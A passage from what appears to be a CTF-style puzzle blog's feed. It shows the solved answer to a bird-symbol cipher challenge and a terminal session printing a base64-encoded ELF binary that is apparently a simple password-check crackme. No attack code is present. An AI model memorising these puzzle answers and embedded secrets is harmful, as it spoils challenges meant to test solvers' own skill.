![022](https://7r1umphk.github.io/image/202506121857563.webp)

https://www.dcode.fr/symbols-ciphers
打开列表找就完事了

![image-20250612185931605](https://7r1umphk.github.io/image/202506121859794.webp)

https://www.dcode.fr/birds-on-a-wire-cipher

![image-20250612190245248](https://7r1umphk.github.io/image/202506121902532.webp)

```
BLUEBIRD
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20022.html</guid><pubDate>Fri, 27 Jun 2025 09:32:05 +0000</pubDate></item><item><title>Challenge 021</title><link>https://7r1UMPHK.github.io/post/Challenge%20021.html</link><description>![image-20250612184142389](https://7r1umphk.github.io/image/202506121841690.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 021.zip 
-rwxr-xr-x 1 kali kali 3576 Jun 12 06:41 021.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 021.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3576 bytes (4 KiB)

Extracting archive: 021.zip
--
Path = 021.zip
Type = zip
Physical Size = 3576

Everything is Ok

Size:       21982
Compressed: 3576
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 21.txt                                                          
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAcBAAAAAAAABAAAAAAAAAAAA3AAAAAAAAAAAAAEAAOAAN
AEAAHwAeAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAGAAAAAAAAsAYAAAAAAAAAEAAA
AAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAsQIAAAAAAACxAgAAAAAAAAAQAAAA
AAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAsAQAAAAAAACwBAAAAAAAAABAAAAAA
AAABAAAABgAAANAtAAAAAAAA0D0AAAAAAADQPQAAAAAAAFgCAAAAAAAAYAIAAAAAAAAAEAAAAAAA
AAIAAAAGAAAA4C0AAAAAAADgPQAAAAAAAOA9AAAAAAAA4AEAAAAAAADgAQAAAAAAAAgAAAAAAAAA
BAAAAAQAAAA4AwAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAACAAAAAAAAAACAAAAAAAAAAE
AAAABAAAAFgDAAAAAAAAWAMAAAAAAABYAwAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAAAFPl
dGQEAAAAOAMAAAAAAAA4AwAAAAAAADgDAAAAAAAAIAAAAAAAAAAgAAAAAAAAAAgAAAAAAAAAUOV0
ZAQAAABUIAAAAAAAAFQgAAAAAAAAVCAAAAAAAAAsAAAAAAAAACwAAAAAAAAABAAAAAAAAABR5XRk
BgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQE
AAAA0C0AAAAAAADQPQAAAAAAANA9AAAAAAAAMAIAAAAAAAAwAgAAAAAAAAEAAAAAAAAAL2xpYjY0
L2xkLWxpbnV4LXg4Ni02NC5zby4yAAAAAAAEAAAAEAAAAAUAAABHTlUAAoAAwAQAAAABAAAAAAAA
AAQAAAAUAAAAAwAAAEdOVQCNEdhwtWSejKGgtndxYMH8U/HwUQQAAAAQAAAAAQAAAEdOVQAAAAAA
AwAAAAIAAAAAAAAAAAAAAAIAAAAIAAAAAQAAAAYAAAAAAIEAAAAAAAgAAAAAAAAA0WXObQAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAEgAAAAAAAAAAAAAAAAAAAAAAAABqAAAAIAAAAAAA
AAAAAAAAAAAAAAAAAAAiAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAEgAAAAAAAAAAAAAAAAAA
AAAAAACGAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAApAAAAEgAAAAAAAAAAAAAAAAAAAAAAAACVAAAA
IAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAX19jeGFfZmluYWxp
emUAX19saWJjX3N0YXJ0X21haW4Ac3RybGVuAF9faXNvYzk5X3NjYW5mAHByaW50ZgBsaWJjLnNv
LjYAR0xJQkNfMi43AEdMSUJDXzIuMi41AEdMSUJDXzIuMzQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9u
ZVRhYmxlAF9fZ21vbl9zdGFydF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAAAAAAgABAAMA
AwABAAQAAQADAAAAAAAAAAEAAwA/AAAAEAAAAAAAAAAXaWkNAAAEAEkAAAAQAAAAdRppCQAAAwBT
AAAAEAAAALSRlgYAAAIAXwAAAAAAAADQPQAAAAAAAAgAAAAAAAAAUBEAAAAAAADYPQAAAAAAAAgA
AAAAAAAAEBEAAAAAAAAgQAAAAAAAAAgAAAAAAAAAIEAAAAAAAADAPwAAAAAAAAYAAAABAAAAAAAA
AAAAAADIPwAAAAAAAAYAAAACAAAAAAAAAAAAAADQPwAAAAAAAAYAAAAFAAAAAAAAAAAAAADYPwAA
AAAAAAYAAAAHAAAAAAAAAAAAAADgPwAAAAAAAAYAAAAIAAAAAAAAAAAAAAAAQAAAAAAAAAcAAAAD
AAAAAAAAAAAAAAAIQAAAAAAAAAcAAAAEAAAAAAAAAAAAAAAQQAAAAAAAAAcAAAAGAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXF
LwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXKLwAA/yXMLwAADx9AAP8lyi8AAGgAAAAA6eD/////
JcIvAABoAQAAAOnQ/////yW6LwAAaAIAAADpwP////8lei8AAGaQAAAAAAAAAAAx7UmJ0V5IieJI
g+TwUFRFMcAxyUiNPc4AAAD/FS8vAAD0Zi4PH4QAAAAAAA8fQABIjT2BLwAASI0Fei8AAEg5+HQV
SIsFDi8AAEiFwHQJ/+APH4AAAAAAww8fgAAAAABIjT1RLwAASI01Si8AAEgp/kiJ8EjB7j9IwfgD
SAHGSNH+dBRIiwXdLgAASIXAdAj/4GYPH0QAAMMPH4AAAAAA8w8e+oA9DS8AAAB1K1VIgz26LgAA
AEiJ5XQMSIs97i4AAOgp////6GT////GBeUuAAABXcMPHwDDDx+AAAAAAPMPHvrpd////1VIieVI
gewgAQAASI0FmQ4AAEiJRejHRfwAAAAAx0X4AQAAAEiNBZAOAABIice4AAAAAOiv/v//SI2F4P7/
/0iJxkiNBYEOAABIice4AAAAAOih/v//SI2F4P7//0iJx+hy/v//SIP4Bg+FxQAAAA+2heD+//88
UHQZSI0FTA4AAEiJx7gAAAAA6Fn+///ptQAAAMdF9AEAAADrNotF9EiYD7aEBeD+//8PvsCD6DAB
RfyLRfRImA+2hAXg/v//D77AjVDQi0X4D6/CiUX4g0X0AYN99AV+xIN9/Bh1QIF9+AAIAAB1Nw+2
heH+//88OHUWSI0F2w0AAEiJx7gAAAAA6OH9///rQEiNBc0NAABIice4AAAAAOjL/f//6ypIjQXE
DQAASInHuAAAAADotf3//+sUSI0FtA0AAEiJx7gAAAAA6J/9//+4AAAAAMnDSIPsCEiDxAjDAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAJHVwZXJaZWNyZXRQ
NHp6AEVudGVyIHBhc3N3ZDogACVzAEFsbW9zdABDb3JyZWN0AHJlYWxseSBjbG9zZQBDbG9zZQBJ
bmNvcnJlY3QAAAABGwM7KAAAAAQAAADM7///dAAAAAzw//+cAAAAHPD//0QAAAAF8f//tAAAABQA
AAAAAAAAAXpSAAF4EAEbDAcIkAEHEBQAAAAcAAAA0O///yIAAAAAAAAAAAAAABQAAAAAAAAAAXpS
AAF4EAEbDAcIkAEAACQAAAAcAAAAUO///0AAAAAADhBGDhhKDwt3CIAAPxo7KjMkIgAAAAAUAAAA
RAAAAGjv//8IAAAAAAAAAAAAAAAcAAAAXAAAAEnw//9PAQAAAEEOEIYCQw0GA0oBDAcIAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
